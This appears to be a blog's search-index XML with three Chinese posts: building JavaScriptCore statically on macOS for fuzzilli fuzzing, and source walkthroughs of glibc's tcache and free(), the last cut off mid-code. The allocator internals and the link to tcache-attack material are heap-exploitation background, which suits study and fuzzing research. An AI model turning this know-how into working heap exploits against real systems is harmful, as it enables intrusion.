<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>MacOS下JSC编译方式的更改</title>
    <link href="/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/"/>
    <url>/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>从论文的Fuzz说起，由于要做WebKit相关的论文工作，fuzzilli是一款很好的Fuzzer，但是fuzzilli针对JSC的fuzz过程是在Linux下进行的。下面探索在MacOS平台上，用fuzzilli对JSC进行fuzz的相关工作。</p><p>从WebKit的角度来讲，它只不过是一个很大的应用程序而已，所以它在Linux和MacOS均可编译，但是在不同的平台，编译的方式有点差别，这里我们做的工作主要针对JS引擎。</p><table><thead><tr><th>平台</th><th>编译难度</th><th>JSC的形式</th><th>配置方式</th></tr></thead><tbody><tr><td>Linux</td><td>相对较易</td><td>默认是编译处理静态库</td><td></td></tr><tr><td>MacOS</td><td>相对较难</td><td>默认编译处理是动态库</td><td>Xcode配置文件</td></tr></tbody></table><p>最初通过默认方式分别在两个平台编译JSC，对比发现Fuzzer跑的效果不一样，在MacOS平台上获取Edge的数量要远远小于Linux下的，最后归因于JSC的动态库和静态库差别导致的。</p><p>JSC编译成动态库的形式，Fuzzer是获取不到其中的Edge，因为最终是编译为jsc程序，动态库并没有将相关代码插入到jsc中，静态库却将代码插入进去，获取Edge相关代码也是插入到jsc程序中的，所以才会有所不同。</p><p>最后是决定在MacOS下将JSC编译为静态库的形式【转换成静态库的形式是正常的】。下面主要是围绕如何将JSC以原有的动态库项目转换成静态库。</p><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>下面修改文件的方式包含了两种，一种是从文本的形式去更改配置文件，另一种是通过Xcode去修改配置文件。</p><h3 id="文本形式"><a href="#文本形式" class="headerlink" title="文本形式"></a>文本形式</h3><p>下面做的更改主要是将JSC由动态库的形式更改为静态库。</p><p>在JavaScriptCore项目配置文件中，打开project.pbxproj文件：</p><ul><li><p>将JavaScriptCore的productType由com.apple.product-type.framework更改为com.apple.product-type.library.static</p></li><li><p>将该文件中的JavaScriptCore.framework更改为libJavaScriptCore.a</p></li></ul><p>下图为以文件夹的形式打开JSC项目配置文件，然后找到project.pbxproj文件，接着以文本的形式打开。上面修改的位置是针对整个文件，所有地方都要修改。</p><p><img src="/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/image-20240828145129622.png"></p><h3 id="Xcode形式"><a href="#Xcode形式" class="headerlink" title="Xcode形式"></a>Xcode形式</h3><h4 id="更改为静态库"><a href="#更改为静态库" class="headerlink" title="更改为静态库"></a>更改为静态库</h4><p>对于Target中JavaScriptCode，需要将其编译的产物更改为静态库：</p><p>Build Settings找到Mach-O Type将Dynamic Library更改为Static Library</p><h4 id="更改依赖"><a href="#更改依赖" class="headerlink" title="更改依赖"></a>更改依赖</h4><p>修改完上面的内容后，JavaScriptCore已经由动态链接库的形式转换为静态库的形式，但是在Xcode中很多Target还是依赖JavaScriptCore.framework的，下面就需要手动将其更改为libJavaScriptCore.a的形式。由于编译jsc需要依赖其他Target，为了让这些Target能够编译成功，需要手动将所有相关Target都进行一个依赖调整。</p><p>比如下面是将minidom依赖的JavaScriptCore由JavaScriptCore.framework更改为libJavaScriptCore.a：</p><p>①、在Build Phases—&gt;Link Binary With Libraries中进行添加。</p><p><img src="/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/image-20240828145432720.png"></p><p>下面是为了解决①遗留问题，如果通过①更改完成后，编译还是报相关错误，可以通过②在命令行参数中手动添加：</p><p>②、如果①设置了仍然报相关错误，就可以在命令行参数添加。在Build Settings—&gt;Linking-General—&gt;Other Linker Flags中添加对应的参数，参数的格式为-l库名</p><p><img src="/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/image-20240828145730017.png"></p><h4 id="其他调整"><a href="#其他调整" class="headerlink" title="其他调整"></a>其他调整</h4><p>下面主要解决编译过程中的一些小错误，比如没用到的函数会触发编译错误，还有就是相关警告也被当成编译错误。</p><h5 id="unused-function"><a href="#unused-function" class="headerlink" title="unused function"></a>unused function</h5><p>关于unused系列，找到对应Target，可以设置是否发出对应的警告</p><p><img src="/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/image-20240828151531690.png"></p><h5 id="Treat-Warnings-as-Errors"><a href="#Treat-Warnings-as-Errors" class="headerlink" title="Treat Warnings as Errors"></a>Treat Warnings as Errors</h5><p>让警告不要当成错误处理：Treat Warnings as Errors由Yes更改为No</p><p><img src="/2024/01/28/MacOS%E4%B8%8BJSC%E7%BC%96%E8%AF%91%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9B%B4%E6%94%B9/image-20240828151637693.png"></p><blockquote><p><a href="https://stackoverflow.com/questions/1349115/how-do-i-change-an-existing-xcode-target-from-dynamic-to-static">https://stackoverflow.com/questions/1349115/how-do-i-change-an-existing-xcode-target-from-dynamic-to-static</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>MacOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JSC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcache源码分析</title>
    <link href="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="关于tcache"><a href="#关于tcache" class="headerlink" title="关于tcache"></a>关于tcache</h1><p>自glibc2.26起，加入了tcache机制，可以参考：</p><blockquote><p>在线看源码：<a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c">malloc.c - malloc&#x2F;malloc.c - Glibc source code (glibc-2.27) - Bootlin</a></p><p>CTFWIKI：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/">Tcache attack - CTF Wiki (ctf-wiki.org)</a></p></blockquote><h2 id="相关宏定义"><a href="#相关宏定义" class="headerlink" title="相关宏定义"></a>相关宏定义</h2><p>下面是以size_t &#x3D; 4为例</p><ul><li>request2size：是根据用户提供的size计算对应的chunk大小</li></ul><p>比如用户提供20，计算的chunk大小是24，减去8字节头部，还剩16字节，然后剩下4字节是下一个chunk的pre_size字段</p><ul><li>tidx2usize，这个是根据tidx计算对应的用户能使用的大小</li></ul><p>比如idx 0，计算得到12 &#x3D;&gt;用户能使用12&#x3D;&gt;对应的chunk大小为16&#x3D;&gt;8（头部）+8（user）+4（pre_size）&#x3D;&gt;用户能使用12字节大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><span class="hljs-comment">//tcache_bin的数目</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS        64</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)</span><br><span class="hljs-comment">//根据idx计算对应的用户可用的最大size</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><span class="hljs-comment">//下面的x是chunk的size，根据chunk的size计算对应的idx</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">//下面的x是user的size，根据用户的size计算对应的idx</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><span class="hljs-comment">//每一个tcache_bin能容纳的chunk数</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//将用户所需的size转为chunk的size</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                         \  </span><br>    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \<br>   MINSIZE :                                                      \<br>    ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)<br></code></pre></td></tr></table></figure><h2 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h2><p>下面是单链表结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><p>下面是线程独有的tcache结构体，__thread关键字是为了线程局部存储TLS</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><span class="hljs-type">static</span> __thread <span class="hljs-type">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>下面这个函数是将一个chunk放进对应的tcache bin单链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个是从对应tcache bin的单链表中取出一个chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="相关应用"><a href="#相关应用" class="headerlink" title="相关应用"></a>相关应用</h2><p>这部分主要看下tcache被应用在哪里，分析一下增加了哪些操作步骤。这里只是截取添加的部分，原有的部分请参考malloc和free的代码分析</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><p>这里有个tcache_unsorted_count后面是为了统计已处理的unsorted chunk</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224035744.png"></p><p>下面是处理fast chunk，先获取一个victim，剩余其他的放进tcache中（前提是对应的tcache bin没有放满）</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224040807.png"></p><p>下面是small chunk，和fast chunk流程一样</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224313049.png"></p><p>下面是定义了一些变量，准备for循环处理unsorted bin时</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224328563.png"></p><p>在for循环处理unsorted chunk时，大小符合，是先将chunk放进tcache中，将return_cached设为1</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224340850.png"></p><p>这里是非size &#x3D;&#x3D;nb的情况，将unsorted chunk放进对应的bin中，然后将unsorted_count+1，如果有设置tcache_unsorted_limit，达到条件就可以直接调用tcache_get，否则是处理完unsorted bin中的chunk，最后调用tcache_get</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224353143.png"></p><h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><p>在free一块内存时，首先看看是否能够放进tcache中，在tcache bin没有放满的情况下，是先将释放的chunk存到tcache中，将tcache放满后才会像正常的free流程那样</p><p><img src="/2023/11/28/tcache%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826224855682.png"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>free源码分析</title>
    <link href="/2023/11/27/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2023/11/27/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="free源码分析"><a href="#free源码分析" class="headerlink" title="free源码分析"></a>free源码分析</h1><h2 id="关于别名"><a href="#关于别名" class="headerlink" title="关于别名"></a>关于别名</h2><p>这里提一下，我们在编程中使用malloc或者free时，glibc中往往是对应的libc_malloc&#x2F;free，下面可以看到在glibc中是通过别名的方式来实现这种映射关系</p><p><img src="/2023/11/27/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826165746269.png"></p><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="libc_free"></a>libc_free</h2><p>大致流程如下：</p><p>1、检查一下是否有hook</p><p>2、关于mmaped memory，释放单独处理</p><p>3、获取ar，arena_for_chunk (p)如果是main_arena就直接返回arena，非主分配区就直接用heap_for_ptr计算，在heap的开头部分</p><p>4、调用int_free函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>    <span class="hljs-keyword">return</span>;<br><br>  p = mem2chunk (mem);<br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><h3 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h3><p>1、地址范围是否合法，地址是否对齐</p><p>2、大小是否合法，大小是否对齐</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk */</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">int</span> locked = <span class="hljs-number">0</span>;<br><br>  size = chunksize (p);<br><br>  <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">     allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">     Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">     here by accident or by &quot;design&quot; from some intruder.  */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>      <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked)<br>        __libc_lock_unlock (av-&gt;mutex);<br>      malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>  <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">     multiple of MALLOC_ALIGNMENT.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><br></code></pre></td></tr></table></figure><h3 id="处理fast-chunk【if】"><a href="#处理fast-chunk【if】" class="headerlink" title="处理fast chunk【if】"></a>处理fast chunk【if】</h3><p>1、注意下面的have_lock是int_free的第三个参数，来表示是否有锁。如果没锁，下面会首先进行上锁，然后再进行操作；</p><p>2、安全检查：p的下一个chunk的大小是否合法，大小是否在范围内</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs C">  check_inuse_chunk(av, p);<span class="hljs-comment">//这里如果没有开启debug模式这里是没用的</span><br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If eligible, place chunk on a fastbin so it can be found</span><br><span class="hljs-comment">    and used quickly in malloc.</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br><span class="hljs-comment">//下面这个宏也是需要开启才能生效的情况，默认下是关闭的</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">bordering top into fastbins</span><br><span class="hljs-comment">      */</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      ) &#123;<br><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))<br>  &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br><span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">   of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">   after getting the lock.  */</span><br><span class="hljs-keyword">if</span> (have_lock<br>    || (&#123; assert (locked == <span class="hljs-number">0</span>);<br>  __libc_lock_lock (av-&gt;mutex);<br>  locked = <span class="hljs-number">1</span>;<br>  chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>      &#125;))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><span class="hljs-keyword">if</span> (! have_lock)<br>  &#123;<br>    __libc_lock_unlock (av-&gt;mutex);<br>    locked = <span class="hljs-number">0</span>;<br>  &#125;<br>      &#125;<br><br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br><br>    set_fastchunks(av);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<br>    fb = &amp;fastbin (av, idx);<br></code></pre></td></tr></table></figure><p>set_fastchunks是通过设置arena的flag标志位来表示fast bin中是含有chunk的</p><p><img src="/2023/11/27/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826170819299.png"></p><h4 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h4><p>目的很简单就是将p插入fast bin中</p><p>主要是下面一段的插入操作，首先old2是old的副本，p是要插入的chunk；</p><p>p-&gt;fd &#x3D; old2 &#x3D; old先将p-&gt;fd设置为old_chunk，并且做一个备份</p><p>下面这个原子操作注意：</p><p>catomic_compare_and_exchange_val_rel (fb, p, old2)) 这个函数目的就是想将p设置为fb的新值，主要操作就是如果fb当前的值是old2，就设置p为fb的当前值，然后返回fb更改之前的值，这样返回给old的即old2，然后old &#x3D; old2 !&#x3D; old2这个条件为假，就会退出循环；</p><p>如果fb当前的值和old2不等，可能被其他线程更改了，这样就不能设置p为fb的新值(因为要更新p-&gt;fd)，这样返回给old fb的当前值，old &#x3D; fb的当前值 !&#x3D; old2条件为真，进入while循环重新设置p-&gt;fd，然后继续这样的操作，直到p写进fb才结束。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs C">  mchunkptr old = *fb, old2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>  <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">          (i.e., double free).  */</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>          &#123;<br>            errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>            <span class="hljs-keyword">goto</span> errout;<br>          &#125;<br>        <span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">          size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">          only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">          deallocated.  See use of OLD_IDX below for the actual check.  */</span><br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>          old_idx = fastbin_index(chunksize(old));<br>          <br>        p-&gt;fd = old2 = old;<br>    &#125;<br>  <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br>  <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> 